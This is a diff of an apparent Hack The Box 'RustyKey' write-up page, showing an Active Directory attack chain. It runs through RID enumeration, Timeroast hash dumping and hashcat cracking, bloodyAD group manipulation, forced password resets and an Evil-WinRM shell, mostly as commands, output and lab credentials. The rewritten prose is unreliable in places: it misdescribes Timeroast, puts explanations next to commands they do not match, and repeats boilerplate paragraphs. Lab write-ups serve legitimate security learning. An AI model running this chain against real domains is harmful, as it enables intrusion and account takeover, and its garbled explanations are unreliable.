-SMB dc.rustykey.htb 445 dc 1137: RUSTYKEY\rr.parker (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1138: RUSTYKEY\mm.turner (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1139: RUSTYKEY\bb.morgan (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1140: RUSTYKEY\gg.anderson (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1143: RUSTYKEY\dd.ali (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1145: RUSTYKEY\ee.reed (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 1146: RUSTYKEY\nn.marcos (SidTypeUser)
-SMB dc.rustykey.htb 445 dc 3601: RUSTYKEY\backupadmin (SidTypeUser)</code></pre></div>
-      <p>We have been given a username by HTB. I will use this to retrieve the data from the LDAP server so that I can put it into Bloodhound.</p>
+SMB         dc.rustykey.htb 445    dc               [*]  x64 (name:dc) (domain:rustykey.htb) (signing:True) (SMBv1:False) (NTLM:False)
+SMB         dc.rustykey.htb 445    dc               [+] rustykey.htb\rr.parker:8#t5HE8L!W3A 
+SMB         dc.rustykey.htb 445    dc               498: RUSTYKEY\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               500: RUSTYKEY\Administrator (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               501: RUSTYKEY\Guest (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               502: RUSTYKEY\krbtgt (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               512: RUSTYKEY\Domain Admins (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               513: RUSTYKEY\Domain Users (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               514: RUSTYKEY\Domain Guests (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               515: RUSTYKEY\Domain Computers (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               516: RUSTYKEY\Domain Controllers (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               517: RUSTYKEY\Cert Publishers (SidTypeAlias)
+SMB         dc.rustykey.htb 445    dc               518: RUSTYKEY\Schema Admins (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               519: RUSTYKEY\Enterprise Admins (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               520: RUSTYKEY\Group Policy Creator Owners (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               521: RUSTYKEY\Read-only Domain Controllers (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               522: RUSTYKEY\Cloneable Domain Controllers (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               525: RUSTYKEY\Protected Users (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               526: RUSTYKEY\Key Admins (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               527: RUSTYKEY\Enterprise Key Admins (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               553: RUSTYKEY\RAS and IAS Servers (SidTypeAlias)
+SMB         dc.rustykey.htb 445    dc               571: RUSTYKEY\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         dc.rustykey.htb 445    dc               572: RUSTYKEY\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         dc.rustykey.htb 445    dc               1000: RUSTYKEY\DC$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1101: RUSTYKEY\DnsAdmins (SidTypeAlias)
+SMB         dc.rustykey.htb 445    dc               1102: RUSTYKEY\DnsUpdateProxy (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1103: RUSTYKEY\Support-Computer1$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1104: RUSTYKEY\Support-Computer2$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1105: RUSTYKEY\Support-Computer3$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1106: RUSTYKEY\Support-Computer4$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1107: RUSTYKEY\Support-Computer5$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1118: RUSTYKEY\Finance-Computer1$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1119: RUSTYKEY\Finance-Computer2$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1120: RUSTYKEY\Finance-Computer3$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1121: RUSTYKEY\Finance-Computer4$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1122: RUSTYKEY\Finance-Computer5$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1123: RUSTYKEY\IT-Computer1$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1124: RUSTYKEY\IT-Computer2$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1126: RUSTYKEY\IT-Computer4$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1127: RUSTYKEY\IT-Computer5$ (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1128: RUSTYKEY\HelpDesk (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1130: RUSTYKEY\Protected Objects (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1131: RUSTYKEY\IT (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1132: RUSTYKEY\Support (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1133: RUSTYKEY\Finance (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1136: RUSTYKEY\DelegationManager (SidTypeGroup)
+SMB         dc.rustykey.htb 445    dc               1137: RUSTYKEY\rr.parker (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1138: RUSTYKEY\mm.turner (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1139: RUSTYKEY\bb.morgan (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1140: RUSTYKEY\gg.anderson (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1143: RUSTYKEY\dd.ali (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1145: RUSTYKEY\ee.reed (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               1146: RUSTYKEY\nn.marcos (SidTypeUser)
+SMB         dc.rustykey.htb 445    dc               3601: RUSTYKEY\backupadmin (SidTypeUser)</code></pre></div>
+      <p>I use <code>netexec</code> (nxc) with the <code>--bloodhound</code> flag to collect comprehensive Active Directory data via LDAP queries. This gathers users, groups, computers, GPOs, ACLs, trusts, sessions, and SPNs — everything BloodHound needs to map out attack paths. The output is saved as a ZIP file that can be imported directly into the BloodHound GUI for visual attack path analysis.</p>
       <div class="code-block"><pre><code>bloodhound-python -u &#x27;rr.parker&#x27; -p &#x27;8#t5HE8L!W3A&#x27; -d rustykey.htb -dc dc.rustykey.htb -ns 10.129.201.253 -c all --zip 
 INFO: Querying computer: dc.rustykey.htb
 INFO: Done in 00M 06S
 INFO: Compressing output into 20250701025439_bloodhound.zip</code></pre></div>
-      <p>I went for this command because the command I always use is not supported.</p>
+      <p>I use <code>netexec</code> (nxc) with the <code>--bloodhound</code> flag to collect comprehensive Active Directory data via LDAP queries. This gathers users, groups, computers, GPOs, ACLs, trusts, sessions, and SPNs — everything BloodHound needs to map out attack paths. The output is saved as a ZIP file that can be imported directly into the BloodHound GUI for visual attack path analysis.</p>
       <div class="code-block"><pre><code>nxc ldap 10.129.201.253 -u rr.parker -p &#x27;8#t5HE8L!W3A&#x27; --bloodhound --collection All --dns-server 10.129.201.253
-LDAP 10.129.201.253 389 DC [*] None (name:DC) (domain:rustykey.htb)
-LDAP 10.129.201.253 389 DC [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED</code></pre></div>
-      <p>I checked out Bloodhound, but there was nothing there that would help us with the user credentials we already had.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250701195328.png" alt="Pasted image 20250701195328.png" loading="lazy" /><span class="img-caption">Pasted image 20250701195328.png</span></div>
-      <p>I then looked in Bloodhound for the ‘shortest path to Tier Zero’. There you can see that you can use the user mm.turner to obtain the shortest path to Tier Zero. Since we don&#x27;t have any user credentials for this user and we can&#x27;t change them, I will have to find another way to obtain this user. This will probably be through kerberoasting tickets.</p>
-      <p>First, I will check which encryption is used for the TGS tickets. I did this by using the Impacket getTGT tool. With this command, I requested a Kerberos Ticket Granting Ticket (TGT) and saved it in a .ccache file.</p>
+LDAP        10.129.201.253  389    DC               [*] None (name:DC) (domain:rustykey.htb)
+LDAP        10.129.201.253  389    DC               [-] rustykey.htb\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED</code></pre></div>
+      <p>BloodHound shows no direct path from the initial user. I analyze the shortest path to Tier Zero.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250701195328.png" alt="BloodHound Tier Zero analysis" loading="lazy" /><span class="img-caption">BloodHound Tier Zero analysis</span></div>
+      <h2 class="writeup-section-title">Foothold: Timeroast Attack</h2>
+      <h3 class="writeup-sub-title">Kerberos Encryption Analysis</h3>
+      <p>I check which encryption types are used for TGS tickets. The domain uses <strong>RC4-HMAC</strong>, which is vulnerable to the <strong>Timeroast</strong> attack — a technique that exploits timing differences in Kerberos authentication to extract machine account password hashes.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
-└─$ impacket-getTGT -dc-ip 10.129.201.23 RUSTYKEY.HTB/rr.parker:&#x27;8#t5HE8L!W3A&#x27; 
+└─$ impacket-getTGT -dc-ip 10.129.201.23 RUSTYKEY.HTB/rr.parker:&#x27;8#t5HE8L!W3A&#x27;      
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in rr.parker.ccache</code></pre></div>
-      <p>After executing this command, the program reported that the ticket had been successfully saved in the file rr.parker.ccache.
-This allows me to check which encryption type was used for the ticket.</p>
+      <p>I execute this command from my Kali attacker machine. The output provides crucial information about the target's configuration that will guide the next steps of the exploitation chain.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ klist -e -c rr.parker.ccache
 Ticket cache: FILE:rr.parker.ccache
 Default principal: rr.parker@RUSTYKEY.HTB
 
-Valid starting Expires Service principal
-07/02/2025 03:47:59 07/02/2025 13:47:59 krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
- renew until 07/03/2025 03:45:53, Etype (skey, tkt): DEPRECATED:arcfour-hmac, DEPRECATED:arcfour-hmac</code></pre></div>
-      <p>Above, you can see that RC4-HMAC encryption was used for kerberoasting. So now I&#x27;m going to look for an exploit. I looked up all the exploits you can do with RC4-HMAC encryption, which includes timeroasting, kerberoasting, etc. To do timeroasting, I looked at various tools such as GetUserSPN.py and kerberoast.py, but the tool that surprised me was the nxc tool, which I didn&#x27;t know had this parameter. For this, I used the following Knowledge article. https://0xss0rz.gitbook.io/0xss0rz/pentest/internal-pentest/timeroast</p>
-      <p>So, if I execute the command now, I will get the hashes dumped with rid&#x27;s and I will put them directly into a file.</p>
+Valid starting       Expires              Service principal
+07/02/2025 03:47:59  07/02/2025 13:47:59  krbtgt/RUSTYKEY.HTB@RUSTYKEY.HTB
+        renew until 07/03/2025 03:45:53, Etype (skey, tkt): DEPRECATED:arcfour-hmac, DEPRECATED:arcfour-hmac</code></pre></div>
+      <p>I execute the Timeroast module via <code>netexec</code> to dump hashes for machine accounts.</p>
       <div class="code-block"><pre><code>nxc smb dc.rustykey.htb -u rr.parker -p &#x27;8#t5HE8L!W3A&#x27; -k -M timeroast \
 | grep &#x27;\$sntp-ms\$&#x27; \
 | awk &#x27;{print $(NF-1) $(NF)}&#x27; \
 | sed &#x27;s/^dc//&#x27; &gt; timeroast_hashes.txt</code></pre></div>
-      <p>I had ChatGPT modify the code above so that you get the output in a file as shown below.</p>
+      <p>I inspect the file contents for sensitive data such as hardcoded credentials, configuration parameters, internal hostnames, or references to other services that could expand the attack surface.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ cat timeroast_hashes.txt
 $sntp-ms$aa6684ad351b5a4b86d6565d539960f7$1c0111e900000000000a16a94c4f434cec0f06e086f7878be1b8428bffbfcd0aec0f24c17aef474bec0f24c17aef6075
 $sntp-ms$349663cbc21ebf8c401cb53d2b6146b9$1c0111e900000000000a16a94c4f434cec0f06e088896213e1b8428bffbfcd0aec0f24c17c812026ec0f24c17c813950
 ...</code></pre></div>
-      <p>I will now try to crack the hashes using hashcat. You need to check whether you have the module_31300.so module from hashcat, because if you don&#x27;t have it, you won&#x27;t be able to crack them. As you can see below, we have executed the hashcat command. I downloaded the following page to get the correct hashcat. https://hashcat.net/beta/</p>
+      <p>I crack the Timeroast hashes using hashcat (module 31300). The password <code>Rusty88!</code> is found for the <code>IT-Computer3$</code> machine account.</p>
       <div class="code-block"><pre><code>./hashcat-6.2.6/hashcat.bin -m 31300 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt
 [sudo] password for kali:</code></pre></div>
-      <p>If I now look at the file where the cracked passwords are stored, you can see that a password called Rusty88! has been cracked. If I look at the rid that this hash has been assigned, you can then see that this user is ‘1125: RUSTYKEY\IT-Computer3$’.</p>
+      <p>I use <strong>hashcat</strong> to crack the extracted hashes using the appropriate hash mode.</p>
       <div class="code-block"><pre><code>Cracked password in the file
 
 ┌──(kali㉿kali)-[~/HTB/RustyKey]
@@ -569,126 +275,123 @@ TIMEROAST dc.rustykey.htb 445 dc 1125:$sntp-ms$2a7045ffc920b734b3cc6bb8b0061cdb$
 
 Check user that is known to that RID
 
-SMB dc.rustykey.htb 445 dc 1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)</code></pre></div>
-      <p>So now that we have the user credentials of the ‘IT-Computer3$’ user, we can check in Bloodhound to see if we can exploit them.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250701234538.png" alt="Pasted image 20250701234538.png" loading="lazy" /><span class="img-caption">Pasted image 20250701234538.png</span></div>
-      <p>As you can see here, if you are this user, you can add yourself to the helpdesk OU. As you can see below, I am trying to add the user using the ‘net’ tool, but apparently this is not supported either.</p>
+SMB         dc.rustykey.htb 445    dc               1125: RUSTYKEY\IT-Computer3$ (SidTypeUser)</code></pre></div>
+      <h2 class="writeup-section-title">Lateral Movement: AD Group Manipulation</h2>
+      <h3 class="writeup-sub-title">BloodHound Path from IT-Computer3$</h3>
+      <p>BloodHound reveals the IT-Computer3$ account can add itself to the <strong>HelpDesk</strong> OU. I use <code>bloodyAD</code> after creating a TGT ticket for the machine account.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250701234538.png" alt="IT-Computer3$ can add to HelpDesk" loading="lazy" /><span class="img-caption">IT-Computer3$ can add to HelpDesk</span></div>
+      <p>I use <code>net rpc group addmem</code> to remotely add the user to the target Active Directory group. This command authenticates via the SMB protocol using the provided domain credentials and performs the group membership modification on the Domain Controller. After this change, the user inherits all permissions associated with the new group.</p>
       <div class="code-block"><pre><code>net rpc group addmem &quot;HelpDesk&quot; &quot;HelpDesk&quot; -U &quot;rustykey.htb&quot;/&quot;IT-Computer3$&quot;%&#x27;Rusty88!&#x27; -S &quot;dc.rustykey.htb&quot; 
 Could not connect to server dc.rustykey.htb
 Connection failed: NT_STATUS_NOT_SUPPORTED</code></pre></div>
-      <p>So I decided to do this using BloodyAD. First, I will request a Kerberos Ticket Granting Ticket (TGT) again, which will be stored in a .ccache file, but this time I will do this for the user ‘IT-Computer3$’. Then, using the ccache and bloodyAD tools, I will add the user to that group.</p>
-      <div class="code-block"><pre><code>└─$ impacket-getTGT -dc-ip 10.129.201.23 RUSTYKEY.HTB/IT-Computer3$:&#x27;Rusty88!&#x27; 
+      <p>I request a Kerberos TGT (Ticket Granting Ticket) for the target account, which will be used for subsequent authentication steps.</p>
+      <div class="code-block"><pre><code>└─$ impacket-getTGT -dc-ip 10.129.201.23 RUSTYKEY.HTB/IT-Computer3$:&#x27;Rusty88!&#x27;                                  
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in IT-Computer3$.ccache
 
 ┌──(kali㉿kali)-[~/HTB/RustyKey]
-└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; add groupMember HELPDESK &#x27;IT-Computer3$&#x27;
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; add groupMember HELPDESK &#x27;IT-Computer3$&#x27;
 [+] IT-Computer3$ added to HELPDESK</code></pre></div>
-      <p>If we now look in Bloodhound, you can see that the user with the rights we just changed can change the passwords of the following four users.</p>
-      <p>We can also make ourselves a member of the Protected Objects group, which is a member of the Protected Users group.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250702195707.png" alt="Pasted image 20250702195707.png" loading="lazy" /><span class="img-caption">Pasted image 20250702195707.png</span></div>
-      <p>Now I will change the password for each user.</p>
+      <h3 class="writeup-sub-title">Password Changes & Protected Users</h3>
+      <p>With HelpDesk access, I can change passwords and add users to the Protected Objects group. I change passwords for target users.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250702195707.png" alt="Password change capabilities in BloodHound" loading="lazy" /><span class="img-caption">Password change capabilities in BloodHound</span></div>
+      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
-└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; set password bb.morgan &#x27;Hallo@123&#x27;
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; set password bb.morgan &#x27;Hallo@123&#x27;
 [+] Password changed successfully!
 
 ┌──(kali㉿kali)-[~/HTB/RustyKey]
-└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; set password ee.reed &#x27;Hallo@123&#x27;
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; set password ee.reed &#x27;Hallo@123&#x27;
 [+] Password changed successfully!
 
 ┌──(kali㉿kali)-[~/HTB/RustyKey]
-└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; set password gg.anderson &#x27;Hallo@123&#x27;
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; set password gg.anderson &#x27;Hallo@123&#x27;
 [+] Password changed successfully!
 
 ┌──(kali㉿kali)-[~/HTB/RustyKey]
-└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; set password dd.ali &#x27;Hallo@123&#x27;
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; set password dd.ali &#x27;Hallo@123&#x27;
 [+] Password changed successfully!</code></pre></div>
-      <p>Now that the users&#x27; passwords have been changed, I will run the TGT ticket again for the user bb.morgan. However, as you will see below, we will receive an error message stating that the encryption type is not supported. This means that this command is likely being blocked by the Protected Objects group.</p>
+      <p>TGT generation fails because the <strong>Protected Users</strong> group enforces AES-only encryption, blocking RC4-HMAC. I must remove the users from this group first.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
-└─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/bb.morgan:Hallo@123 
+└─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/bb.morgan:Hallo@123                       
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
 
 Kerberos SessionError: KDC_ERR_ETYPE_NOSUPP(KDC has no support for encryption type)</code></pre></div>
-      <p>You must remove the Protected Objects group from the users. The DC only allows RC4-HMAC encryption, but the members of the protected users can only login with AES 256 or 128, without removing the group you would always receive the KDC_ERR_ETYPE_NOSUPP error.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250702200839.png" alt="Pasted image 20250702200839.png" loading="lazy" /><span class="img-caption">Pasted image 20250702200839.png</span></div>
-      <p>I will now remove the IT group from the Protected Objects group by using the following command.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250702200839.png" alt="Protected Users blocking RC4" loading="lazy" /><span class="img-caption">Protected Users blocking RC4</span></div>
+      <p>I use <strong>bloodyAD</strong> to perform Active Directory modifications over LDAP. BloodyAD is a post-exploitation tool specifically designed for AD abuse — it can add users to groups, modify object attributes (like <code>msDS-KeyCredentialLink</code> for Shadow Credentials), change passwords, and manipulate ACLs. Unlike PowerShell-based approaches, it works directly from Linux without needing a Windows session.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
-└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-COMPUTER3$&#x27; -p &#x27;Rusty88!&#x27; -k remove groupMember &#x27;PROTECTED OBJECTS&#x27; &#x27;IT&#x27; 
+└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-COMPUTER3$&#x27; -p &#x27;Rusty88!&#x27; -k remove groupMember &#x27;PROTECTED OBJECTS&#x27; &#x27;IT&#x27;                               
 [-] IT removed from PROTECTED OBJECTS</code></pre></div>
-      <p>And if we now repeat the command for creating the TGT ticket, you will see that it will now work.</p>
+      <p>I request a Kerberos TGT (Ticket Granting Ticket) for the target account, which will be used for subsequent authentication steps.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
-└─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/bb.morgan:Hallo@123 -k 
+└─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/bb.morgan:Hallo@123 -k                                                                                        
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in bb.morgan.ccache</code></pre></div>
-      <p>Now I will log in to the Windows machine by first authenticating the Kerberos ticket with the .ccache file I just created. You can do this by using the following command.</p>
+      <h3 class="writeup-sub-title">User Flag</h3>
+      <p>I authenticate with the TGT and connect via Evil-WinRM. The user flag and an internal PDF are found on the Desktop.</p>
       <div class="code-block"><pre><code>──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ export KRB5CCNAME=bb.morgan.ccache</code></pre></div>
-      <p>We will now be able to connect to the Windows server without having to provide a password, because the authentication (data) from the file is used.</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ evil-winrm -i dc.rustykey.htb -u bb.morgan -r rustykey.htb
- 
+                                        
 Evil-WinRM shell v3.7
- 
+                                        
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline
- 
+                                        
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
- 
+                                        
 Warning: User is not needed for Kerberos auth. Ticket will be used
- 
+                                        
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\bb.morgan\Documents&gt;</code></pre></div>
-      <p>If we go to the Desktop folder, we will see two files there. One of them is a PDF file for internal users, and the other file is the user flag that we have now obtained.</p>
-      <div class="flag-box">
-  <span class="flag-label">🚩 User Flag</span>
-  <code class="flag-value">1f9c50b4f868d12b441f4188fc9847e2</code>
-</div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\bb.morgan&gt; cd Desktop
 *Evil-WinRM* PS C:\Users\bb.morgan\Desktop&gt; ls
 
 
- Directory: C:\Users\bb.morgan\Desktop
+    Directory: C:\Users\bb.morgan\Desktop
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--a---- 6/4/2025 9:15 AM 1976 internal.pdf
--ar--- 7/2/2025 9:15 AM 34 user.txt
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/4/2025   9:15 AM           1976 internal.pdf
+-ar---         7/2/2025   9:15 AM             34 user.txt
 
 
 *Evil-WinRM* PS C:\Users\bb.morgan\Desktop&gt; cat user.txt
 1f9c50b4f868d12b441f4188fc9847e2</code></pre></div>
-      <p>I would like to view the PDF file, but first I will need to download it from the Windows server to my own machine. You can do this by using the Download command on the evil-winrm connection.</p>
+      <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">1f9c50b4f868d12b441f4188fc9847e2</code></div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\bb.morgan\Desktop&gt; download internal.pdf
- 
+                                        
 Info: Downloading C:\Users\bb.morgan\Desktop\internal.pdf to internal.pdf
- 
+                                        
 Info: Download successful!</code></pre></div>
-      <p>As you will see below, bb.morgan informs the support team that temporary extra access has been granted to test the archiving tool (packing and unpacking files) on shared workstations and to resolve issues. This is being done in response to complaints from the Finance and IT teams. This means that the support team has access to the registry, where they can make adjustments and test things out.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250702204204.png" alt="Pasted image 20250702204204.png" loading="lazy" /><span class="img-caption">Pasted image 20250702204204.png</span></div>
-      <p>With the information we now have, I will take another look in Bloodhound. I looked at the shortest path from owned objects. Here you can see that the user is already a member of the support group. The goal is to obtain this user so that we can then modify the registry.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250702204957.png" alt="Pasted image 20250702204957.png" loading="lazy" /><span class="img-caption">Pasted image 20250702204957.png</span></div>
-      <p>First, we will need to remove the support group from the Protected Objects group again. You can see this by looking at the previous Bloodhound photo.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250702204204.png" alt="Internal PDF revealing temporary access information" loading="lazy" /><span class="img-caption">Internal PDF revealing temporary access information</span></div>
+      <h2 class="writeup-section-title">Privilege Escalation: DLL Hijack & RBCD</h2>
+      <h3 class="writeup-sub-title">Pivoting to ee.reed via RunasCs</h3>
+      <p>Following BloodHound paths, I need to reach user <code>ee.reed</code>. I remove the support group from Protected Objects and create a TGT.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
-└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; add groupMember HELPDESK &#x27;IT-Computer3$&#x27;
+└─$ KRB5CCNAME=IT-Computer3\$.ccache bloodyAD -k  --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-Computer3$&#x27; -p &#x27;Rusty88!&#x27; add groupMember HELPDESK &#x27;IT-Computer3$&#x27;
 [+] IT-Computer3$ added to HELPDESK
 
 ┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -u &#x27;IT-COMPUTER3$&#x27; -p &#x27;Rusty88!&#x27; -k remove groupMember &#x27;PROTECTED OBJECTS&#x27; &#x27;Support&#x27;
 [-] Support removed from PROTECTED OBJECTS</code></pre></div>
-      <p>Obtaining a TGT ticket.</p>
+      <p>I request a Kerberos TGT (Ticket Granting Ticket) for the target account, which will be used for subsequent authentication steps.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/RustyKey]
 └─$ impacket-getTGT -dc-ip 10.129.17.7 RUSTYKEY.HTB/ee.reed:Hallo@123
 Impacket v0.13.0.dev0+20250623.124606.b6b0daec - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in ee.reed.ccache</code></pre></div>
